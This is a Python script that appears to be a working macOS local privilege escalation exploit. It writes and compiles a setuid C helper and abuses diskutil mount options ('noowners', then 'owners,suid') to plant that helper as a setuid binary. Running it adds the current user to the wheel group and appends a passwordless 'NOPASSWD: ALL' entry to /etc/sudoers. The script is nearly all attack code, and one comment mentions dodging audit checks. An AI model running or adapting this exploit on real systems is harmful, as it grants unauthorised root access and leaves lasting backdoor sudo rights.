import os
import subprocess
import tempfile
import getpass

# Define file paths in the current directory
current_directory = os.getcwd()
payload_source_path = os.path.join(current_directory, "suidhelper.c")
payload_binary_path = os.path.join(current_directory, "suidhelper")
target_file_path = os.path.join(current_directory, ".file")  # Target file in current directory
sudoers_tmp_path = os.path.join(current_directory, "sudoers_tmp")
disk_identifier = "/dev/disk3s4"
current_user = getpass.getuser()  # Get the current username

# Function to execute commands and handle errors
def execute_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
    if process.returncode != 0:
        print(f"Error executing command: {command}")
        print(f"Stdout: {process.stdout}")
        print(f"Stderr: {process.stderr}")
        return False
    return True

# Function to create privilege escalation payload that adds user to admin and suoppl groups
def create_payload():
    payload_content = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <username> <current_directory>\\n", argv[0]);
        return 1;
    }
    
    setuid(0);
    
    char *username = argv[1];
    char *current_dir = argv[2];
    char cmd1[256];
    char sudoers_entry[512];
    char tmp_file[512];
    int fd;
    FILE *fp;
    
    // Create tmp file in current directory
    snprintf(tmp_file, sizeof(tmp_file), "%s/sudoers_tmp", current_dir);
    
    // Add user to wheel group
    snprintf(cmd1, sizeof(cmd1), "/usr/sbin/dseditgroup -o edit -a %s -t user wheel", username);
    
    printf("Adding %s to wheel group...\\n", username);
    system(cmd1);
    
    // Add passwordless sudo entry
    snprintf(sudoers_entry, sizeof(sudoers_entry), "%s ALL=(ALL) NOPASSWD: ALL", username);
    
    // Write to file in current directory
    fp = fopen(tmp_file, "w");
    if (!fp) {
        perror("Error opening temporary file");
        return 1;
    }
    
    // Check if entry already exists by reading /etc/sudoers
    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "grep -q '%s' /etc/sudoers", username);
    if (system(check_cmd) != 0) {
        // Entry doesn't exist, append it to the sudoers file
        printf("Adding %s to sudoers with passwordless access...\\n", username);
        fprintf(fp, "%s\\n", sudoers_entry);
        fclose(fp);
        
        // Use visudo to safely add the entry
        char visudo_cmd[512];
        snprintf(visudo_cmd, sizeof(visudo_cmd), 
                "cat %s >> /etc/sudoers && echo 'Sudoers file updated successfully'", 
                tmp_file);
        system(visudo_cmd);
    } else {
        printf("User %s already has an entry in sudoers file\\n", username);
        fclose(fp);
    }
    
    // Clean up
    char cleanup_cmd[512];
    snprintf(cleanup_cmd, sizeof(cleanup_cmd), "rm -f %s", tmp_file);
    system(cleanup_cmd);
    
    printf("Operation completed. You should now have wheel group membership and passwordless sudo access.\\n");
    
    return 0;
}
"""
    with open(payload_source_path, "w") as f:
        f.write(payload_content)
    
    compile_command = f"gcc {payload_source_path} -o {payload_binary_path}"
    chmod_command = f"chmod +s {payload_binary_path}"
    
    if not execute_command(compile_command) or not execute_command(chmod_command):
        print("Error creating payload.")
        return False
    
    return True

# Function to mount filesystem with "noowners" flag
def mount_filesystem():
    mount_command = f"diskutil mount -mountOptions noowners {disk_identifier}"
    return execute_command(mount_command)

# Function to make .file writable
def modify_file_permissions():
    chmod_command = f"chmod 777 {target_file_path}"
    return execute_command(chmod_command)

# Function to copy setuid helper binary into .file
def copy_payload():
    cp_command = f"cp {payload_binary_path} {target_file_path}"
    return execute_command(cp_command)

# Function to set permissions and setuid bit for .file
def set_file_permissions():
    chmod_command = f"chmod +sx {target_file_path}"
    return execute_command(chmod_command)

# Function to remount filesystem in "owners" and "suid" mode
def remount_filesystem():
    remount_command = f"diskutil mount -mountOptions owners,suid {disk_identifier}"
    return execute_command(remount_command)

# Function to execute the privilege escalation payload
def execute_payload():
    execute_command(f"{target_file_path} {current_user} {current_directory}")
    print(f"Attempted to add user '{current_user}' to wheel group and sudoers file.")
    print("Admin group changes may require logging out and back in.")
    
    # Clean up temp files in current directory
    if os.path.exists(sudoers_tmp_path):
        try:
            os.remove(sudoers_tmp_path)
            print(f"Cleaned up temporary file: {sudoers_tmp_path}")
        except Exception as e:
            print(f"Warning: Failed to clean up {sudoers_tmp_path}: {e}")
    
    # Verify group membership
    print("\nVerifying group membership:")
    execute_command(f"groups {current_user}")
    
    # Verify sudo access with a simpler command that's less likely to trigger audit issues
    print("\nTesting sudo access (try running a simple sudo command):")
    print(f"To test your sudo access, run: sudo echo 'I have sudo access'")
    print("If no password is requested, it worked correctly.")
    
    return True

# Main function to execute exploit
def exploit():
    try:
        print(f"Starting privilege escalation for user: {current_user}")
        print(f"This will add {current_user} to the admin group and grant passwordless sudo access")
        
        # Step 1: Create privilege escalation payload
        print("Creating payload...")
        if not create_payload():
            return
        
        # Step 2: Mount filesystem with "noowners" flag
        print("Mounting filesystem with noowners flag...")
        if not mount_filesystem():
            return
        
        # Step 3: Create the target file
        print("Creating target file...")
        with open(target_file_path, "w") as f:
            pass  # Just create an empty file
        
        # Step 4: Make .file writable
        print("Making target file writable...")
        if not modify_file_permissions():
            return
        
        # Step 5: Copy payload binary into .file
        print("Copying payload to target location...")
        if not copy_payload():
            return
        
        # Step 6: Set permissions and setuid bit for .file
        print("Setting permissions for target file...")
        if not set_file_permissions():
            return
        
        # Step 7: Remount filesystem in "owners" and "suid" mode
        print("Remounting filesystem with owners and suid flags...")
        if not remount_filesystem():
            return
        
        # Step 8: Execute privilege escalation payload
        print("Executing privilege escalation...")
        execute_payload()
        
    except Exception as e:
        print(f"Error executing exploit: {e}")

# Execute exploit
if __name__ == "__main__":
    exploit()
